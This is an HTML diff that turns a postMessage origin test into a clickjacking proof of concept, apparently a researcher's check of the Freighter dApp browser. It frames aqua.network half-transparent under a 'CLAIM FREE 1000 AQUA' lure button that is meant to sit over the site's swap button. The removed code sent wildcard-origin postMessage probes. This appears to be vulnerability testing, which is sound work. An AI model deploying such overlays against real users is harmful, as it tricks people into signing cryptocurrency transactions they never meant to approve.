@@ -3,43 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<title>Test Iframe Origin - Freighter</title>
+<title>Clickjacking Test - Freighter</title>
 <style>
-body{font-family:monospace;padding:15px;background:#0a0a0a;color:#eee}
-#log{background:#111;border:1px solid #333;padding:10px;height:200px;overflow-y:scroll;margin-top:10px;font-size:12px}
-.ok{color:#4ade80}.warn{color:#f87171;font-weight:bold}
-iframe{border:2px solid #333;border-radius:12px}
+body{margin:0;font-family:monospace;background:#000;color:#fff;padding:10px}
+#container{position:relative;width:100%;height:600px;border:2px solid #333;overflow:hidden}
+#victim{position:absolute;top:0;left:0;width:100%;height:100%;border:none;opacity:0.5;z-index:1}
+#attacker{position:absolute;top:200px;left:50px;z-index:2;background:#ff0066;padding:20px 40px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:18px;box-shadow:0 0 20px #ff0066}
+#log{background:#111;border:1px solid #333;padding:10px;margin-top:10px;font-size:12px;height:100px;overflow-y:auto}
 </style>
 </head>
 <body>
-<h3>Test Iframe Origin - Freighter</h3>
-<div>Parent: 0x403for.github.io</div>
-<div>Child: aqua.network</div>
-<div id="log"></div>
-<iframe id="aqua" src="https://aqua.network" width="100%" height="400"></iframe>
+<h3>Clickjacking Test - Freighter dApp Browser</h3>
+<p>Parent: 0x403for.github.io (attacker)</p>
+<p>Child: aqua.network (victim) opacity 0.5</p>
+<div id="container">
+  <iframe id="victim" src="https://aqua.network"></iframe>
+  <div id="attacker" onclick="clicked()">🎁 CLAIM FREE 1000 AQUA - CLICK HERE!</div>
+</div>
+<div id="log">Waiting...</div>
 <script>
 const logEl=document.getElementById('log');
-function log(m,c=''){const d=document.createElement('div');d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;d.className=c;logEl.appendChild(d)}
-const iframe=document.getElementById('aqua');
-iframe.onload=()=>{
-  log('Iframe loaded. Mengirim TEST payload...','ok');
-  iframe.contentWindow.postMessage("PING_FROM_0x403for","*");
-  log('Sent: PING_FROM_0x403for with targetOrigin=*');
-  iframe.contentWindow.postMessage({type:"TEST_ORIGIN_CHECK",source:"0x403for.github.io",action:"ping"},"*");
-  log('Sent: {type: TEST_ORIGIN_CHECK}','');
-};
-window.addEventListener("message",(event)=>{
-  log(`Received! origin=${event.origin} data=${JSON.stringify(event.data).slice(0,200)}`,'');
-  if(event.origin.includes("aqua.network")){
-    if(event.data && (event.data.signed || event.data.approved || event.data.txHash)){
-      log(`BUG REAL! execute payload dari 0x403for!`,'warn');
-      alert("BUG REAL: aqua.network execute payload attacker!");
-    } else {
-      log(`SECURE: aqua.network tidak execute PING kita. Pesan normal onLoad.`,'ok');
-    }
-  }
+function log(m){logEl.innerHTML+=`<div>[${new Date().toLocaleTimeString()}] ${m}</div>`}
+function clicked(){
+  log('ATTACKER BUTTON CLICKED! Cek apakah SWAP di belakang ke-trigger?');
+  alert('Kamu klik attacker. Kalau muncul popup Sign di Freighter padahal ga klik SWAP NOW = BUG!');
+}
+window.addEventListener('load',()=>{
+  log('Page loaded. Posisikan tombol pink di atas SWAP NOW ungu, lalu klik.');
 });
-log('Waiting for iframe...','');
 </script>
 </body>
 </html>
